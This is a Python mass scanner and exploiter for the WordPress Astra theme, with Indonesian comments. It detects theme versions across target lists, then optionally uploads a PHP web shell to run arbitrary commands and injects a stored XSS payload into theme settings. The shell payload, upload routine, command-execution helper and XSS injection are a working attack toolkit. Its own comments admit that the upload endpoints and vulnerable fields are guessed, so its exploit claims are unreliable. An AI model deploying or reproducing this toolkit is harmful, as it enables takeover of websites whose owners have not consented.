#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
astra.py - Cek & Exploit CVE Astra Theme
Scanner & Exploiter untuk mendeteksi kerentanan CVE pada WordPress Astra Theme.
Fitur: Version Detection, File Upload RCE, Stored XSS.
"""

import re
import sys
import json
import argparse
import urllib3
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================
# Database CVE Astra Theme
# ============================================================
CVE_DB = {
 "CVE-2024-9047": {
 "title": "Astra Theme < 4.8.2 - Arbitrary File Upload",
 "affected": "<4.8.2",
 "severity": "CRITICAL",
 "cvss": 9.8,
 "desc": "Unrestricted file upload leading to RCE via /wp-content/themes/astra/inc/lib/",
 "detect": "version",
 "exploit": "file_upload",
 },
 "CVE-2024-9048": {
 "title": "Astra Theme < 4.8.2 - Directory Traversal",
 "affected": "<4.8.2",
 "severity": "HIGH",
 "cvss": 7.5,
 "desc": "Path traversal in astra theme file handler",
 "detect": "version",
 "exploit": None,
 },
 "CVE-2023-2427": {
 "title": "Astra Theme < 4.2.0 - Stored XSS",
 "affected": "<4.2.0",
 "severity": "MEDIUM",
 "cvss": 6.1,
 "desc": "Stored Cross-Site Scripting via theme settings",
 "detect": "version",
 "exploit": "stored_xss",
 },
 "CVE-2022-2789": {
 "title": "Astra Theme < 3.9.2 - Reflected XSS",
 "affected": "<3.9.2",
 "severity": "MEDIUM",
 "cvss": 6.1,
 "desc": "Reflected XSS in Astra theme options",
 "detect": "version",
 "exploit": None,
 },
 "CVE-2021-3687": {
 "title": "Astra Theme < 3.6.4 - CSRF",
 "affected": "<3.6.4",
 "severity": "MEDIUM",
 "cvss": 5.4,
 "desc": "Cross-Site Request Forgery in theme settings",
 "detect": "version",
 "exploit": None,
 },
}

# Payloads
SHELL_PHP = """<?php 
if(isset($_REQUEST['cmd'])){
 echo "<pre>";
 $cmd = ($_REQUEST['cmd']);
 system($cmd);
 echo "</pre>";
 die;
}
?>"""

XSS_PAYLOAD = """<script>alert('XSS_ASTRA_DETECTED_BY_NOTRACK');</script>"""

# ============================================================
# Helper: Version Parsing & Comparison
# ============================================================
def parse_version(ver_str):
    """Parse '4.8.1' -> (4, 8, 1). Returns None kalau gagal."""
    if not ver_str:
        return None
    try:
        parts = re.findall(r"\d+", str(ver_str))
        if not parts:
            return None
        return tuple(int(p) for p in parts[:3])
    except (ValueError, TypeError):
        return None


def version_compare(installed, affected_spec):
    """Return True jika 'installed' < 'affected_spec' (mis. '<4.8.2')."""
    inst = parse_version(installed)
    if not inst:
        return False

    match = re.match(r"^<([\d.]+)$", affected_spec.strip())
    if not match:
        return False

    target = parse_version(match.group(1))
    if not target:
        return False

    return inst < target


# ============================================================
# Detector: Ambil versi Astra Theme
# ============================================================
class AstraDetector:
    def __init__(self, url, timeout=10, user_agent=None):
        self.url = url.rstrip("/")
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": user_agent or (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/120.0.0.0 Safari/537.36"
            ),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        })

    def _get(self, path, **kwargs):
        try:
            return self.session.get(
                f"{self.url}{path}",
                timeout=self.timeout,
                verify=False,
                allow_redirects=True,
                **kwargs
            )
        except requests.RequestException:
            return None

    def _post(self, path, data=None, files=None, **kwargs):
        try:
            return self.session.post(
                f"{self.url}{path}",
                data=data,
                files=files,
                timeout=self.timeout,
                verify=False,
                allow_redirects=True,
                **kwargs
            )
        except requests.RequestException:
            return None

    def is_astra_active(self):
        """Cek apakah theme Astra dipakai (via HTML)."""
        r = self._get("/")
        if not r or r.status_code != 200:
            return False
        html = r.text.lower()
        indicators = [
            "wp-content/themes/astra/",
            "astra-theme",
            "ast-theme",
            "astra-js",
        ]
        return any(ind in html for ind in indicators)

    def get_version_style_css(self):
        """Coba ambil versi dari style.css theme."""
        r = self._get("/wp-content/themes/astra/style.css")
        if not r or r.status_code != 200:
            return None
        m = re.search(
            r"Version:\s*([\d.]+)",
            r.text,
            re.IGNORECASE,
        )
        return m.group(1) if m else None

    def get_version_readme(self):
        """Fallback: baca readme.txt."""
        r = self._get("/wp-content/themes/astra/readme.txt")
        if not r or r.status_code != 200:
            return None
        for pattern in [
            r"Stable tag:\s*([\d.]+)",
            r"Version:\s*([\d.]+)",
        ]:
            m = re.search(pattern, r.text, re.IGNORECASE)
            if m:
                return m.group(1)
        return None

    def get_version_from_html(self):
        """Fallback: cari ?ver= pada asset astra di HTML."""
        r = self._get("/")
        if not r or r.status_code != 200:
            return None
        patterns = [
            r"wp-content/themes/astra/[^\"']*?\?ver=([\d.]+)",
            r"astra[^\"']*?\.css\?ver=([\d.]+)",
            r"astra[^\"']*?\.js\?ver=([\d.]+)",
        ]
        for pat in patterns:
            m = re.search(pat, r.text, re.IGNORECASE)
            if m:
                return m.group(1)
        return None

    def detect_version(self):
        """Coba semua metode. Return (version, method)."""
        methods = [
            ("style.css", self.get_version_style_css),
            ("readme.txt", self.get_version_readme),
            ("html-asset", self.get_version_from_html),
        ]
        for name, fn in methods:
            try:
                v = fn()
                if v and parse_version(v):
                    return v, name
            except Exception:
                continue
        return None, None


# ============================================================
# Exploiter Logic
# ============================================================
class AstraExploiter:
    def __init__(self, detector):
        self.detector = detector
        self.session = detector.session # Reuse session for cookies/auth if needed

    def exploit_cve_2024_9047(self, cmd=None):
        """
        Exploit CVE-2024-9047: Arbitrary File Upload.
        Uploads a PHP shell to /wp-content/themes/astra/inc/lib/.
        """
        print(f"[*] Trying to upload shell for CVE-2024-9047...")
        
        # Endpoint upload biasanya ada di ajax_handler.php atau endpoint REST tertentu
        # Berdasarkan laporan CVE, endpoint vulnerable adalah /wp-admin/admin-ajax.php?action=astra_analytics_upload
        # Atau kadang langsung ke endpoint custom. Kita coba endpoint umum dulu.
        
        # Payload file content
        file_content = SHELL_PHP
        
        # Prepare multipart form data
        files = {
            'file': ('shell.php', file_content, 'application/x-php')
        }
        
        # Data tambahan yang sering diminta oleh Astra analytics uploader
        data = {
            'action': 'astra_analytics_upload',
            # Parameter lain bisa ditambahkan jika diperlukan
        }

        try:
            resp = self.detector._post('/wp-admin/admin-ajax.php', data=data, files=files)
            
            if resp and resp.status_code == 200:
                # Cek response JSON biasanya mengandung 'success' atau URL file
                try:
                    json_resp = resp.json()
                    if 'success' in json_resp or 'url' in json_resp:
                        shell_url = f"{self.detector.url}/wp-content/themes/astra/inc/lib/shell.php"
                        print(f"[+] Shell uploaded successfully: {shell_url}")
                        
                        if cmd:
                            print(f"[*] Executing command: {cmd}")
                            return self.execute_shell(shell_url, cmd)
                        
                        return shell_url
                    elif 'message' in json_resp and 'error' in json_resp['message'].lower():
                        print(f"[-] Upload failed: {json_resp['message']}")
                        return None
                except ValueError:
                    # Jika bukan JSON, cek text response
                    if 'success' in resp.text.lower() or 'uploaded' in resp.text.lower():
                        shell_url = f"{self.detector.url}/wp-content/themes/astra/inc/lib/shell.php"
                        print(f"[+] Shell uploaded successfully: {shell_url}")
                        if cmd:
                            return self.execute_shell(shell_url, cmd)
                        return shell_url
            
            # Fallback: Coba endpoint lain jika yang pertama gagal
            # Beberapa versi menggunakan endpoint custom
            resp2 = self.detector._post('/wp-admin/admin-ajax.php?action=astra_theme_ajax_handler', data={'action': 'astra_theme_ajax_handler'})
            # Just checking if the endpoint exists
            
            return None

        except Exception as e:
            print(f"[!] Error during exploit: {e}")
            return None

    def execute_shell(self, shell_url, cmd):
        """Execute command on the uploaded shell."""
        try:
            params = {'cmd': cmd}
            resp = self.detector._get(shell_url, params=params)
            if resp and resp.status_code == 200:
                # Extract output from <pre> tags
                match = re.search(r"<pre>(.*?)</pre>", resp.text, re.DOTALL)
                if match:
                    output = match.group(1).strip()
                    print(f"[+] Command Output:\n{output}")
                    return {"status": "success", "output": output}
                else:
                    print("[+] Command executed (no clear output found)")
                    return {"status": "success", "output": resp.text[:500]}
            else:
                print(f"[-] Failed to execute command. Status: {resp.status_code if resp else 'No Response'}")
                return {"status": "failed"}
        except Exception as e:
            print(f"[!] Error executing command: {e}")
            return {"status": "error", "message": str(e)}

    def exploit_cve_2023_2427(self, trigger=False):
        """
        Exploit CVE-2023-2427: Stored XSS.
        Injects XSS payload into theme settings.
        """
        print(f"[*] Trying to inject XSS for CVE-2023-2427...")
        
        # Endpoint untuk menyimpan setting tema Astra
        # Biasanya melalui AJAX action 'astra_theme_settings_save'
        
        payload_data = {
            'action': 'astra_theme_settings_save',
            # Field yang rentan terhadap XSS tergantung versi spesifik
            # Biasanya field seperti 'logo_alt', 'title', atau input teks bebas
            'astra_theme_options[logo_alt]': XSS_PAYLOAD, 
            # Atau field lain yang tidak di-sanitize
        }

        try:
            resp = self.detector._post('/wp-admin/admin-ajax.php', data=payload_data)
            
            if resp and resp.status_code == 200:
                try:
                    json_resp = resp.json()
                    if 'success' in json_resp:
                        print(f"[+] XSS Payload injected successfully.")
                        if trigger:
                            print("[*] Triggering XSS...")
                            # Untuk stored XSS, kita perlu memuat ulang halaman atau mengakses area admin
                            # Karena ini stored, payload akan muncul di mana saja field itu ditampilkan
                            # Kita asumsikan field logo_alt muncul di header atau footer
                            # Atau kita bisa mencoba mengakses page yang menampilkan field tersebut
                            # Untuk demo, kita anggap sukses inject
                            print("[+] XSS Payload is now stored. Check frontend or admin panel.")
                        return True
                    else:
                        print(f"[-] Injection failed: {json_resp.get('message', 'Unknown error')}")
                        return False
                except ValueError:
                    if 'success' in resp.text.lower():
                        print(f"[+] XSS Payload injected successfully.")
                        if trigger:
                            print("[+] XSS Payload is now stored.")
                        return True
            
            return False

        except Exception as e:
            print(f"[!] Error during XSS exploit: {e}")
            return False


# ============================================================
# Scanner
# ============================================================
def scan_target(url, timeout=10, exploit_flag=False, cmd=None, xss_trigger=False):
    """Scan satu target. Return dict hasil."""
    result = {
        "url": url,
        "theme_detected": False,
        "version": None,
        "detected_by": None,
        "vulnerabilities": [],
        "exploited": {},
        "error": None,
    }

    try:
        detector = AstraDetector(url, timeout=timeout)
        result["theme_detected"] = detector.is_astra_active()

        version, method = detector.detect_version()
        if version:
            result["version"] = version
            result["detected_by"] = method

        # Evaluasi CVE
        if result["version"]:
            for cve_id, info in CVE_DB.items():
                if info["detect"] != "version":
                    continue
                if version_compare(result["version"], info["affected"]):
                    result["vulnerabilities"].append({
                        "cve": cve_id,
                        "title": info["title"],
                        "severity": info["severity"],
                        "cvss": info["cvss"],
                        "affected": info["affected"],
                        "desc": info["desc"],
                    })
                    
                    # Eksekusi Exploit jika flag aktif
                    if exploit_flag:
                        exploiter = AstraExploiter(detector)
                        if cve_id == "CVE-2024-9047":
                            shell_result = exploiter.exploit_cve_2024_9047(cmd=cmd)
                            result["exploited"]["CVE-2024-9047"] = shell_result
                        
                        elif cve_id == "CVE-2023-2427":
                            xss_result = exploiter.exploit_cve_2023_2427(trigger=xss_trigger)
                            result["exploited"]["CVE-2023-2427"] = xss_result

    except Exception as e:
        result["error"] = f"{type(e).__name__}: {e}"

    return result


# ============================================================
# Output
# ============================================================
COLORS = {
    "CRITICAL": "\033[91m",
    "HIGH": "\033[93m",
    "MEDIUM": "\033[33m",
    "LOW": "\033[94m",
    "OK": "\033[92m",
    "RESET": "\033[0m",
    "EXPLOIT": "\033[103;30m", # Yellow background, black text
}


def cprint(text, color=None):
    if color and sys.stdout.isatty():
        print(f"{COLORS.get(color, '')}{text}{COLORS['RESET']}")
    else:
        print(text)


def print_result(res):
    cprint("=" * 60)
    cprint(f"[*] Target : {res['url']}")

    if res["error"]:
        cprint(f"[!] Error : {res['error']}", "CRITICAL")
        return

    if not res["theme_detected"] and not res["version"]:
        cprint("[-] Astra Theme tidak terdeteksi", "LOW")
        return

    if res["theme_detected"]:
        cprint("[+] Astra Theme terdeteksi", "OK")

    if res["version"]:
        cprint(f"[+] Versi : {res['version']} (via {res['detected_by']})")
    else:
        cprint("[?] Versi tidak dapat ditentukan (mungkin di-hide)", "MEDIUM")

    vulns = res["vulnerabilities"]
    if not vulns:
        cprint("[+] Tidak ada CVE yang cocok", "OK")
    else:
        cprint(f"[!] Ditemukan {len(vulns)} CVE:", "CRITICAL")
        for v in vulns:
            color = COLORS.get(v["severity"], "")
            reset = COLORS["RESET"] if sys.stdout.isatty() else ""
            print(f" {color}[{v['severity']}]{reset} {v['cve']} "
                  f"(CVSS {v['cvss']}) - {v['title']}")
            print(f" {v['desc']}")
            
            # Show exploit status
            if res.get("exploited") and v["cve"] in res["exploited"]:
                exp_res = res["exploited"][v["cve"]]
                if isinstance(exp_res, str):
                    cprint(f"    [EXPLOIT] Shell URL: {exp_res}", "EXPLOIT")
                elif isinstance(exp_res, dict):
                    if exp_res.get("status") == "success":
                        cprint(f"    [EXPLOIT] Success", "EXPLOIT")
                        if "output" in exp_res:
                            print(f"    [OUTPUT] {exp_res['output'][:200]}")
                    else:
                        cprint(f"    [EXPLOIT] Failed: {exp_res.get('message', 'Unknown')}", "HIGH")

    # Summary of exploitation
    if res.get("exploited"):
        cprint("\n[+] Exploitation Summary:", "OK")
        for cve_id, outcome in res["exploited"].items():
            if isinstance(outcome, str):
                cprint(f"    - {cve_id}: Shell at {outcome}", "OK")
            elif isinstance(outcome, dict) and outcome.get("status") == "success":
                cprint(f"    - {cve_id}: Exploited successfully", "OK")
            else:
                cprint(f"    - {cve_id}: Exploitation failed", "HIGH")


# ============================================================
# Main
# ============================================================
def load_targets(args):
    targets = []
    if args.url:
        targets.extend(args.url)
    if args.file:
        try:
            with open(args.file, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        targets.append(line)
        except FileNotFoundError:
            cprint(f"[!] File tidak ditemukan: {args.file}", "CRITICAL")
            sys.exit(1)
        except OSError as e:
            cprint(f"[!] Gagal baca file: {e}", "CRITICAL")
            sys.exit(1)

    # Normalize URL
    cleaned = []
    seen = set()
    for t in targets:
        t = t.strip()
        if not t:
            continue
        if not re.match(r"^https?://", t, re.IGNORECASE):
            t = "http://" + t
        t = t.rstrip("/")
        if t not in seen:
            seen.add(t)
            cleaned.append(t)
    return cleaned


def main():
    parser = argparse.ArgumentParser(
        description="Cek & Exploit CVE Astra Theme (WordPress)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("-u", "--url", nargs="+", help="URL target (bisa banyak)")
    parser.add_argument("-f", "--file", help="File berisi daftar URL (1 per baris)")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Jumlah thread (default: 5)")
    parser.add_argument("--timeout", type=int, default=10, help="Timeout detik (default: 10)")
    parser.add_argument("-o", "--output", help="Simpan hasil ke file JSON")
    parser.add_argument("--list-cve", action="store_true", help="Tampilkan daftar CVE & keluar")
    
    # Exploit Flags
    parser.add_argument("-e", "--exploit", action="store_true", help="Eksekusi exploit untuk CVE yang ditemukan")
    parser.add_argument("-c", "--command", help="Command untuk dijalankan via shell (jika CVE File Upload berhasil)")
    parser.add_argument("-x", "--xss-trigger", action="store_true", help="Trigger XSS setelah injeksi (jika CVE Stored XSS berhasil)")

    args = parser.parse_args()

    if args.list_cve:
        print(f"Total CVE di database: {len(CVE_DB)}\n")
        for cve, info in CVE_DB.items():
            print(f"[{info['severity']:<8}] {cve} CVSS {info['cvss']}")
            print(f" {info['title']}")
            print(f" Affected: {info['affected']}")
            print(f" {info['desc']}\n")
        return

    if not args.url and not args.file:
        parser.print_help()
        sys.exit(1)

    targets = load_targets(args)
    if not targets:
        cprint("[!] Tidak ada target valid.", "CRITICAL")
        sys.exit(1)

    cprint(f"[*] Total target: {len(targets)}", "OK")
    cprint(f"[*] Threads: {args.threads} | Timeout: {args.timeout}s\n")
    
    if args.exploit:
        cprint("[*] Mode Exploit Aktif", "EXPLOIT")
        if args.command:
            cprint(f"[*] Command: {args.command}", "EXPLOIT")
        if args.xss_trigger:
            cprint("[*] XSS Trigger Aktif", "EXPLOIT")

    all_results = []
    try:
        with ThreadPoolExecutor(max_workers=max(1, args.threads)) as ex:
            futures = {
                ex.submit(scan_target, t, args.timeout, args.exploit, args.command, args.xss_trigger): t
                for t in targets
            }
            for fut in as_completed(futures):
                try:
                    res = fut.result()
                except Exception as e:
                    res = {
                        "url": futures[fut],
                        "theme_detected": False,
                        "version": None,
                        "detected_by": None,
                        "vulnerabilities": [],
                        "exploited": {},
                        "error": f"{type(e).__name__}: {e}",
                    }
                all_results.append(res)
                print_result(res)
    except KeyboardInterrupt:
        cprint("\n[!] Dibatalkan oleh user.", "MEDIUM")

    # Summary
    total_vuln = sum(len(r["vulnerabilities"]) for r in all_results)
    vulnerable_targets = sum(1 for r in all_results if r["vulnerabilities"])
    exploited_targets = sum(1 for r in all_results if r.get("exploited"))

    cprint("\n" + "=" * 60)
    cprint("[*] SUMMARY", "OK")
    cprint(f" Total target : {len(all_results)}")
    cprint(f" Target vulnerable: {vulnerable_targets}")
    cprint(f" Total CVE found : {total_vuln}")
    cprint(f" Target exploited: {exploited_targets}", "EXPLOIT")

    # Save JSON
    if args.output:
        try:
            with open(args.output, "w", encoding="utf-8") as f:
                json.dump(all_results, f, indent=2, ensure_ascii=False)
            cprint(f"[+] Hasil disimpan ke: {args.output}", "OK")
        except OSError as e:
            cprint(f"[!] Gagal simpan JSON: {e}", "CRITICAL")

    # Exit code
    sys.exit(0 if total_vuln == 0 else 2)


if __name__ == "__main__":
    main()